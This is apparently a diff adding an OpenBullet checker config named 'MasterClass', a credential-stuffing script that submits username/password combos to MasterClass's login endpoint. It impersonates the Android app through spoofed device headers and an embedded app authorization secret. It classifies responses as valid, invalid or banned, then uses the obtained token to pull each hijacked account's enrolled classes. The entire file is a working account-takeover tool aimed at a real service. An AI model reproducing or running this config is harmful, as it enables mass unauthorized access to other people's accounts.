@@ -1,0 +1,83 @@
+[SETTINGS]
+{
+  "Name": "MasterClass",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-10-27T04:22:19.3013559-05:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.1.4",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "?h?h?h?h?h?h?h?h-?h?h?h?h-4?h?h?h?h-?h?h?h?h-?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "guid" 
+
+REQUEST POST "https://www.masterclass.com/auth/identity/callback" 
+  CONTENT "grant_type=password&auth_key=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Authorization: Basic Zjc2YjdmY2U4MDcxMzBjMmFiOThlNmU2OTg0NGE1OTFkMDY1NDhlNGQyNTg5NWRkNjliMzExMmY4OTk5YWU0Zjo0NzcwMDEzOThkOWI0YTgxNzFkNDg5MDFlMTBmOTE5NjdiNGU3ZmIyZDQwOGM2NjUwOWJlN2ZjNjViYjdkMjkz" 
+  HEADER "X-DEVICE-ID: <guid>" 
+  HEADER "X-Device-Info: device_os=Android/22/5.1.1 device type=LGE/LGM-V300K/LGM-V300K" 
+  HEADER "X-App-Info: version=1.4.5/194 version_code=194 application_id=com.mc.core" 
+  HEADER "User-Agent: Android/22/5.1.1/<guid>/LGE/LGM-V300K/LGM-V300K/MasterClass/194/1.4.5" 
+  HEADER "Accept-Encoding: gzip" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "{\"status\":\"failed\"}" 
+  KEYCHAIN Ban OR 
+    KEY "Retry later" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN" 
+
+REQUEST POST "https://www.masterclass.com/graphql" AutoRedirect=FALSE 
+  CONTENT "{\"operationName\":\"Home\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"329af65609aab4091ca40adad0c15205f6589b8baf36408c40dac5ab7521e465\"}},\"query\":\"query Home {  ios_home {    __typename    top_section {      __typename      title      subtitle      cta_text      cta_url    }    resume_section {      __typename      id      progress      course {        __typename        id        title        slug        mobile_instructor_profile_image_url        chapters {          __typename          id          title          number          duration          abstract          thumb_url          video_id        }        instructor {          __typename          name        }        categories {          __typename          id          name        }      }      resume_chapter {        __typename        id        title        number        abstract        thumb_url        video_id        duration      }    }    latest_classes {      __typename      id      title      is_blacklisted      slug      categories {        __typename        id        name      }      mobile_instructor_profile_image_url      instructor {        __typename        name      }    }    class_preview {      __typename      content      id      slug      content_type      cover_image      description      title      type      course {        __typename        id        title        is_blacklisted        slug        categories {          __typename          id          name        }        mobile_instructor_profile_image_url        instructor {          __typename          name        }      }    }    popular_lessons {      __typename      id      video_id      duration      number      abstract      title      thumb_url      course {        __typename        id        title        is_blacklisted        slug        categories {          __typename          id          name        }        mobile_instructor_profile_image_url        instructor {          __typename          name        }      }    }    popular_classes {      __typename      id      title      is_blacklisted      slug      categories {        __typename        id        name      }      mobile_instructor_profile_image_url      instructor {        __typename        name      }    }    recommended_courses {      __typename      id      title      is_blacklisted      slug      categories {        __typename        id        name      }      mobile_instructor_profile_image_url      instructor {        __typename        name      }    }  }}\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: application/json" 
+  HEADER "X-APOLLO-OPERATION-ID: ce394f40e1a7eed6f4789d51e1e5fd72cb4056f8e9ad2de583617360da804ff7" 
+  HEADER "X-APOLLO-OPERATION-NAME: account" 
+  HEADER "X-APOLLO-CACHE-KEY: b38e2e30b05a4344ee30eddc19991b7c" 
+  HEADER "X-APOLLO-CACHE-FETCH-STRATEGY: NETWORK_ONLY" 
+  HEADER "X-APOLLO-EXPIRE-TIMEOUT: 0" 
+  HEADER "X-APOLLO-EXPIRE-AFTER-READ: false" 
+  HEADER "X-APOLLO-PREFETCH: false" 
+  HEADER "X-APOLLO-CACHE-DO-NOT-STORE: false" 
+  HEADER "App-Authorization: Basic Zjc2YjdmY2U4MDcxMzBjMmFiOThlNmU2OTg0NGE1OTFkMDY1NDhlNGQyNTg5NWRkNjliMzExMmY4OTk5YWU0Zjo0NzcwMDEzOThkOWI0YTgxNzFkNDg5MDFlMTBmOTE5NjdiNGU3ZmIyZDQwOGM2NjUwOWJlN2ZjNjViYjdkMjkz" 
+  HEADER "X-DEVICE-ID: <guid>" 
+  HEADER "X-Device-Info: device_os=Android/22/5.1.1 device type=LGE/LGM-V300K/LGM-V300K" 
+  HEADER "X-App-Info: version=1.4.5/194 version_code=194 application_id=com.mc.core" 
+  HEADER "User-Agent: Android/22/5.1.1/<guid>/LGE/LGM-V300K/LGM-V300K/MasterClass/194/1.4.5" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "Accept-Encoding: gzip" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" DoesNotContain "resume_chapter" 
+
+PARSE "<SOURCE>" JSON "chapters" -> VAR "1" 
+
+FUNCTION CountOccurrences "\"title\": \"" "<1>" -> CAP "Amount Of Classes" 
+
+PARSE "<1>" LR "\"title\": \"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Classes" 
+
